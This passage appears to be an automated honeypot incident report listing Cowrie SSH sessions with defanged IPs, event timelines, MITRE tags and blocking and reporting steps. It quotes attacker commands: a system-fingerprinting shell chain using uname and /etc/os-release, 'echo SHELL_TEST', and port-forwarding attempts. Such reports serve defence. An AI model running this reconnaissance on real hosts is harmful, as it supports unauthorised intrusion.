| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:31:19` | `cowrie.session.connect` |
| `2026-08-16 17:31:19` | `cowrie.client.version` |
| `2026-08-16 17:31:19` | `cowrie.client.kex` |
| `2026-08-16 17:31:20` | `cowrie.login.success` |
| `2026-08-16 17:31:22` | `cowrie.session.params` |
| `2026-08-16 17:31:22` | `cowrie.command.input` |
| `2026-08-16 17:31:22` | `cowrie.command.input` |
| `2026-08-16 17:31:22` | `cowrie.command.input` |
| `2026-08-16 17:31:22` | `cowrie.command.input` |
| `2026-08-16 17:31:22` | `cowrie.command.input` |
| `2026-08-16 17:31:22` | `cowrie.command.success` |
| `2026-08-16 17:31:22` | `cowrie.command.input` |
| `2026-08-16 17:31:22` | `cowrie.command.input` |
| `2026-08-16 17:31:22` | `cowrie.command.input` |
| `2026-08-16 17:31:22` | `cowrie.command.input` |
| `2026-08-16 17:31:22` | `cowrie.log.closed` |
| `2026-08-16 17:31:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6417501082b

| Field | Detail |
|---|---|
| **Source IP** | `116.99.174[.]243` |
| **First Seen** | 2026-08-16 17:31 |
| **Last Seen** | 2026-08-16 17:31 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:31:44` | `cowrie.session.connect` |
| `2026-08-16 17:31:44` | `cowrie.client.version` |
| `2026-08-16 17:31:45` | `cowrie.client.kex` |
| `2026-08-16 17:31:47` | `cowrie.login.success` |
| `2026-08-16 17:31:48` | `cowrie.direct-tcpip.request` |
| `2026-08-16 17:31:48` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-16 17:31:48` | `cowrie.direct-tcpip.data` |
| `2026-08-16 17:31:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.99.174[.]243` to AbuseIPDB if not already reported
- [ ] Block `116.99.174[.]243` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce8f59365deb

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-16 17:32 |
| **Last Seen** | 2026-08-16 17:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:32:26` | `cowrie.session.connect` |
| `2026-08-16 17:32:26` | `cowrie.client.version` |
| `2026-08-16 17:32:26` | `cowrie.client.kex` |
| `2026-08-16 17:32:26` | `cowrie.login.success` |
| `2026-08-16 17:32:27` | `cowrie.session.params` |
| `2026-08-16 17:32:27` | `cowrie.command.input` |
| `2026-08-16 17:32:28` | `cowrie.log.closed` |
| `2026-08-16 17:32:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03cd04944656

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-16 17:33 |
| **Last Seen** | 2026-08-16 17:33 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:33:23` | `cowrie.session.connect` |
| `2026-08-16 17:33:24` | `cowrie.client.version` |
| `2026-08-16 17:33:24` | `cowrie.client.kex` |
| `2026-08-16 17:33:26` | `cowrie.login.success` |
| `2026-08-16 17:33:27` | `cowrie.session.params` |
| `2026-08-16 17:33:27` | `cowrie.command.input` |
| `2026-08-16 17:33:27` | `cowrie.command.input` |
| `2026-08-16 17:33:27` | `cowrie.command.input` |
| `2026-08-16 17:33:27` | `cowrie.command.input` |
| `2026-08-16 17:33:27` | `cowrie.command.input` |
| `2026-08-16 17:33:27` | `cowrie.command.success` |
| `2026-08-16 17:33:27` | `cowrie.command.input` |
| `2026-08-16 17:33:27` | `cowrie.command.input` |
| `2026-08-16 17:33:27` | `cowrie.command.input` |
| `2026-08-16 17:33:27` | `cowrie.command.input` |
| `2026-08-16 17:33:28` | `cowrie.log.closed` |
| `2026-08-16 17:33:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cdb27db6d24d

| Field | Detail |
|---|---|
| **Source IP** | `171.231.196[.]16` |
| **First Seen** | 2026-08-16 17:33 |
| **Last Seen** | 2026-08-16 17:34 |
| **Session Duration** | 34s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:33:40` | `cowrie.session.connect` |
| `2026-08-16 17:33:46` | `cowrie.client.version` |
| `2026-08-16 17:33:53` | `cowrie.client.kex` |
| `2026-08-16 17:34:03` | `cowrie.login.success` |
| `2026-08-16 17:34:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.231.196[.]16` to AbuseIPDB if not already reported
- [ ] Block `171.231.196[.]16` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70ed15225993

| Field | Detail |
|---|---|
| **Source IP** | `171.231.196[.]16` |
| **First Seen** | 2026-08-16 17:34 |
| **Last Seen** | 2026-08-16 17:34 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:34:23` | `cowrie.session.connect` |
| `2026-08-16 17:34:23` | `cowrie.client.version` |
| `2026-08-16 17:34:23` | `cowrie.client.kex` |
| `2026-08-16 17:34:26` | `cowrie.login.success` |
| `2026-08-16 17:34:30` | `cowrie.direct-tcpip.request` |
| `2026-08-16 17:34:31` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-16 17:34:31` | `cowrie.direct-tcpip.data` |
| `2026-08-16 17:34:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.231.196[.]16` to AbuseIPDB if not already reported
- [ ] Block `171.231.196[.]16` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76e60ac99d0a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-16 17:35 |
| **Last Seen** | 2026-08-16 17:35 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:35:18` | `cowrie.session.connect` |
| `2026-08-16 17:35:18` | `cowrie.client.version` |
| `2026-08-16 17:35:18` | `cowrie.client.kex` |
| `2026-08-16 17:35:20` | `cowrie.login.success` |
| `2026-08-16 17:35:21` | `cowrie.session.params` |
| `2026-08-16 17:35:21` | `cowrie.command.input` |
| `2026-08-16 17:35:21` | `cowrie.command.input` |
| `2026-08-16 17:35:21` | `cowrie.command.input` |
| `2026-08-16 17:35:21` | `cowrie.command.input` |
| `2026-08-16 17:35:21` | `cowrie.command.input` |
| `2026-08-16 17:35:21` | `cowrie.command.success` |
| `2026-08-16 17:35:21` | `cowrie.command.input` |
| `2026-08-16 17:35:21` | `cowrie.command.input` |
| `2026-08-16 17:35:21` | `cowrie.command.input` |
| `2026-08-16 17:35:21` | `cowrie.command.input` |
| `2026-08-16 17:35:22` | `cowrie.log.closed` |
| `2026-08-16 17:35:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02c558df346f

| Field | Detail |
|---|---|
| **Source IP** | `171.231.196[.]16` |
| **First Seen** | 2026-08-16 17:36 |
| **Last Seen** | 2026-08-16 17:36 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:36:07` | `cowrie.session.connect` |
| `2026-08-16 17:36:08` | `cowrie.client.version` |
| `2026-08-16 17:36:09` | `cowrie.client.kex` |
| `2026-08-16 17:36:22` | `cowrie.login.success` |
| `2026-08-16 17:36:23` | `cowrie.direct-tcpip.request` |
| `2026-08-16 17:36:24` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-16 17:36:24` | `cowrie.direct-tcpip.data` |
| `2026-08-16 17:36:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.231.196[.]16` to AbuseIPDB if not already reported
- [ ] Block `171.231.196[.]16` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7a5a4bd610c

| Field | Detail |
|---|---|
| **Source IP** | `31.77.227[.]120` |
| **First Seen** | 2026-08-16 17:36 |
| **Last Seen** | 2026-08-16 17:37 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:36:48` | `cowrie.session.connect` |
| `2026-08-16 17:36:51` | `cowrie.client.version` |
| `2026-08-16 17:36:51` | `cowrie.client.kex` |
| `2026-08-16 17:36:59` | `cowrie.login.success` |
| `2026-08-16 17:37:04` | `cowrie.session.params` |
| `2026-08-16 17:37:04` | `cowrie.command.input` |
| `2026-08-16 17:37:07` | `cowrie.log.closed` |
| `2026-08-16 17:37:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.77.227[.]120` to AbuseIPDB if not already reported
- [ ] Block `31.77.227[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08514697bb68

| Field | Detail |
|---|---|
| **Source IP** | `31.77.227[.]120` |
| **First Seen** | 2026-08-16 17:37 |
| **Last Seen** | 2026-08-16 17:37 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:37:07` | `cowrie.session.connect` |
| `2026-08-16 17:37:09` | `cowrie.client.version` |
| `2026-08-16 17:37:09` | `cowrie.client.kex` |
| `2026-08-16 17:37:17` | `cowrie.login.success` |
| `2026-08-16 17:37:19` | `cowrie.session.params` |
| `2026-08-16 17:37:19` | `cowrie.command.input` |
| `2026-08-16 17:37:19` | `cowrie.log.closed` |
| `2026-08-16 17:37:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.77.227[.]120` to AbuseIPDB if not already reported
- [ ] Block `31.77.227[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9056cf68abb

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-16 17:37 |
| **Last Seen** | 2026-08-16 17:37 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:37:11` | `cowrie.session.connect` |
| `2026-08-16 17:37:11` | `cowrie.client.version` |
| `2026-08-16 17:37:11` | `cowrie.client.kex` |
| `2026-08-16 17:37:12` | `cowrie.login.success` |
| `2026-08-16 17:37:14` | `cowrie.session.params` |
| `2026-08-16 17:37:14` | `cowrie.command.input` |
| `2026-08-16 17:37:14` | `cowrie.command.input` |
| `2026-08-16 17:37:14` | `cowrie.command.input` |
| `2026-08-16 17:37:14` | `cowrie.command.input` |
| `2026-08-16 17:37:14` | `cowrie.command.input` |
| `2026-08-16 17:37:14` | `cowrie.command.success` |
| `2026-08-16 17:37:14` | `cowrie.command.input` |
| `2026-08-16 17:37:14` | `cowrie.command.input` |
| `2026-08-16 17:37:14` | `cowrie.command.input` |
| `2026-08-16 17:37:14` | `cowrie.command.input` |
| `2026-08-16 17:37:14` | `cowrie.log.closed` |
| `2026-08-16 17:37:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b168a313b313

| Field | Detail |
|---|---|
| **Source IP** | `31.77.227[.]120` |
| **First Seen** | 2026-08-16 17:38 |
| **Last Seen** | 2026-08-16 17:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:38:01` | `cowrie.session.connect` |
| `2026-08-16 17:38:01` | `cowrie.client.version` |
| `2026-08-16 17:38:01` | `cowrie.client.kex` |
| `2026-08-16 17:38:02` | `cowrie.login.success` |
| `2026-08-16 17:38:02` | `cowrie.session.params` |
| `2026-08-16 17:38:02` | `cowrie.command.input` |
| `2026-08-16 17:38:03` | `cowrie.log.closed` |
| `2026-08-16 17:38:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.77.227[.]120` to AbuseIPDB if not already reported
- [ ] Block `31.77.227[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db11156685e9

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-16 17:39 |
| **Last Seen** | 2026-08-16 17:39 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:39:03` | `cowrie.session.connect` |
| `2026-08-16 17:39:03` | `cowrie.client.version` |
| `2026-08-16 17:39:03` | `cowrie.client.kex` |
| `2026-08-16 17:39:05` | `cowrie.login.success` |
| `2026-08-16 17:39:06` | `cowrie.session.params` |
| `2026-08-16 17:39:06` | `cowrie.command.input` |
| `2026-08-16 17:39:06` | `cowrie.command.input` |
| `2026-08-16 17:39:06` | `cowrie.command.input` |
| `2026-08-16 17:39:06` | `cowrie.command.input` |
| `2026-08-16 17:39:06` | `cowrie.command.input` |
| `2026-08-16 17:39:06` | `cowrie.command.success` |
| `2026-08-16 17:39:06` | `cowrie.command.input` |
| `2026-08-16 17:39:06` | `cowrie.command.input` |
| `2026-08-16 17:39:06` | `cowrie.command.input` |
| `2026-08-16 17:39:06` | `cowrie.command.input` |
| `2026-08-16 17:39:07` | `cowrie.log.closed` |
| `2026-08-16 17:39:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a847f8101e95

| Field | Detail |
|---|---|
| **Source IP** | `116.99.170[.]187` |
| **First Seen** | 2026-08-16 17:39 |
| **Last Seen** | 2026-08-16 17:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:39:15` | `cowrie.session.connect` |
| `2026-08-16 17:39:15` | `cowrie.client.version` |
| `2026-08-16 17:39:15` | `cowrie.client.kex` |
| `2026-08-16 17:39:17` | `cowrie.login.success` |
| `2026-08-16 17:39:17` | `cowrie.direct-tcpip.request` |
| `2026-08-16 17:39:18` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-16 17:39:18` | `cowrie.direct-tcpip.data` |
| `2026-08-16 17:39:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.99.170[.]187` to AbuseIPDB if not already reported
- [ ] Block `116.99.170[.]187` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-083b146e1afc

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-16 17:40 |
| **Last Seen** | 2026-08-16 17:41 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:40:58` | `cowrie.session.connect` |
| `2026-08-16 17:40:58` | `cowrie.client.version` |
| `2026-08-16 17:40:58` | `cowrie.client.kex` |
| `2026-08-16 17:40:59` | `cowrie.login.success` |
| `2026-08-16 17:41:01` | `cowrie.session.params` |
| `2026-08-16 17:41:01` | `cowrie.command.input` |
| `2026-08-16 17:41:01` | `cowrie.command.input` |
| `2026-08-16 17:41:01` | `cowrie.command.input` |
| `2026-08-16 17:41:01` | `cowrie.command.input` |
| `2026-08-16 17:41:01` | `cowrie.command.input` |
| `2026-08-16 17:41:01` | `cowrie.command.success` |
| `2026-08-16 17:41:01` | `cowrie.command.input` |
| `2026-08-16 17:41:01` | `cowrie.command.input` |
| `2026-08-16 17:41:01` | `cowrie.command.input` |
| `2026-08-16 17:41:01` | `cowrie.command.input` |
| `2026-08-16 17:41:01` | `cowrie.log.closed` |
| `2026-08-16 17:41:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db88b73978a9

| Field | Detail |
|---|---|
| **Source IP** | `116.99.170[.]187` |
| **First Seen** | 2026-08-16 17:42 |
| **Last Seen** | 2026-08-16 17:42 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:42:21` | `cowrie.session.connect` |
| `2026-08-16 17:42:21` | `cowrie.client.version` |
| `2026-08-16 17:42:21` | `cowrie.client.kex` |
| `2026-08-16 17:42:22` | `cowrie.login.success` |
| `2026-08-16 17:42:23` | `cowrie.direct-tcpip.request` |
| `2026-08-16 17:42:23` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-16 17:42:23` | `cowrie.direct-tcpip.data` |
| `2026-08-16 17:42:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.99.170[.]187` to AbuseIPDB if not already reported
- [ ] Block `116.99.170[.]187` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64498f7c225e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-16 17:42 |
| **Last Seen** | 2026-08-16 17:42 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:42:54` | `cowrie.session.connect` |
| `2026-08-16 17:42:55` | `cowrie.client.version` |
| `2026-08-16 17:42:55` | `cowrie.client.kex` |
| `2026-08-16 17:42:56` | `cowrie.login.success` |
| `2026-08-16 17:42:57` | `cowrie.session.params` |
| `2026-08-16 17:42:57` | `cowrie.command.input` |
| `2026-08-16 17:42:57` | `cowrie.command.input` |
| `2026-08-16 17:42:57` | `cowrie.command.input` |
| `2026-08-16 17:42:57` | `cowrie.command.input` |
| `2026-08-16 17:42:57` | `cowrie.command.input` |
| `2026-08-16 17:42:57` | `cowrie.command.success` |
| `2026-08-16 17:42:57` | `cowrie.command.input` |
| `2026-08-16 17:42:57` | `cowrie.command.input` |
| `2026-08-16 17:42:57` | `cowrie.command.input` |
| `2026-08-16 17:42:57` | `cowrie.command.input` |
| `2026-08-16 17:42:58` | `cowrie.log.closed` |
| `2026-08-16 17:42:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f0f73eb5f3e

| Field | Detail |
|---|---|
| **Source IP** | `27.79.43[.]66` |
| **First Seen** | 2026-08-16 17:43 |
| **Last Seen** | 2026-08-16 17:45 |
| **Session Duration** | 131s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:43:04` | `cowrie.session.connect` |
| `2026-08-16 17:43:04` | `cowrie.client.version` |
| `2026-08-16 17:43:04` | `cowrie.client.kex` |
| `2026-08-16 17:43:58` | `cowrie.login.success` |
| `2026-08-16 17:45:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.79.43[.]66` to AbuseIPDB if not already reported
